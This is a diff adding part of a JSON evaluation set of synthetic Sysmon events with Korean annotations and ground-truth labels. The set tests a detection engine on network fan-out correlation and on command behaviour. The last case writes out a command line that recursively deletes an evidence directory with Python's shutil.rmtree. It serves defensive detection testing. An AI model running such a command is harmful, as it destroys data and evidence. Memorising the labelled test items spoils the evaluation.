+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "192.0.2.3",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-mixed-direction",
+      "group_id": "fanout-mixed-direction",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "발신 두 개와 수신 한 개이므로 발신 세 목적지 조건을 만족하지 않습니다.",
+      "context": "benign",
+      "expected_engine_behavior": "수신을 빼면 두 목적지만 남아 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1100,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.20",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1101,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:10.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.21",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1102,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:20.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.22",
+            "DestinationPort": "443",
+            "Initiated": "false"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-multi-unknown",
+      "group_id": "fanout-eval-unknown",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "unknown",
+      "truth_reason": "두 연결의 방향이 없어 실제 세 발신 목적지 조건은 판단할 수 없습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "명시적 발신만 집계하므로 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1110,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.30",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1111,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:10.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.31",
+            "DestinationPort": "443"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1112,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:20.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.32",
+            "DestinationPort": "443"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-ipv6-equivalent",
+      "group_id": "fanout-ipv6-equivalent",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "negative",
+      "truth_reason": "서로 다른 세 표기이지만 모두 같은 IPv6 주소입니다.",
+      "context": "benign",
+      "expected_engine_behavior": "동일 주소를 정규화해 상관 결과가 없을 것으로 예상합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1120,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "2001:db8::1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1121,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:10.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "2001:0db8:0:0:0:0:0:1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1122,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:20.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "2001:DB8::1",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-partial-batch",
+      "group_id": "fanout-invalid-member",
+      "split": "eval",
+      "unit": "batch",
+      "task": "fanout_condition",
+      "truth": "unknown",
+      "truth_reason": "세 번째 입력의 목적지 필드가 유효하지 않아 전체 배치의 실제 세 목적지 조건을 판단하지 않습니다.",
+      "context": "unknown",
+      "expected_engine_behavior": "잘못된 항목을 개별 오류로 보고 전체 사례를 점수에서 제외합니다.",
+      "technique_truth": {},
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 5000,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.40",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 5001,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:01.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "203.0.113.41",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        },
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 3,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 5002,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:02.000",
+            "Image": "C:\\Synthetic\\client.exe",
+            "CommandLine": "",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000002}",
+            "ProcessId": "1234",
+            "SourceIp": "192.0.2.10",
+            "SourcePort": "50000",
+            "DestinationIp": "invalid-ip",
+            "DestinationPort": "443",
+            "Initiated": "true"
+          }
+        }
+      ]
+    },
+    {
+      "case_id": "eval-python-rmtree",
+      "group_id": "python-rmtree",
+      "split": "eval",
+      "unit": "event",
+      "task": "command_behavior",
+      "truth": "positive",
+      "truth_reason": "가상의 증거 보관 디렉터리를 Python shutil.rmtree로 재귀 제거하려는 상황으로 설정했습니다. 실제 파괴 성공이나 악성 행위를 입증하지 않으며 명령을 실행하지 않습니다.",
+      "context": "suspicious",
+      "expected_engine_behavior": "현재 파괴 규칙에 shutil.rmtree가 없고 Python 실행도 기준선 신호에 없어 전체 관제 탐지를 놓칠 수 있습니다.",
+      "technique_truth": {
+        "T1485": "positive",
+        "T1059": "positive"
+      },
+      "synthetic": true,
+      "events": [
+        {
+          "System": {
+            "Provider": "Microsoft-Windows-Sysmon",
+            "EventID": 1,
+            "TimeCreated": "2026-01-01T00:00:00Z",
+            "Computer": "EVAL-HOST",
+            "EventRecordID": 1799,
+            "Channel": "Microsoft-Windows-Sysmon/Operational"
+          },
+          "EventData": {
+            "UtcTime": "2026-01-01 00:00:00.000",
+            "Image": "C:\\Synthetic\\python.exe",
+            "CommandLine": "python.exe -c \"import shutil; shutil.rmtree('/lab/evidence')\"",
+            "ParentImage": "C:\\Synthetic\\explorer.exe",
+            "User": "EVAL\\synthetic",
+            "ProcessGuid": "{00000000-0000-0000-0000-000000000001}",
+            "ProcessId": "1234"
+          }
+        }
+      ]
+    }
+  ]
+}
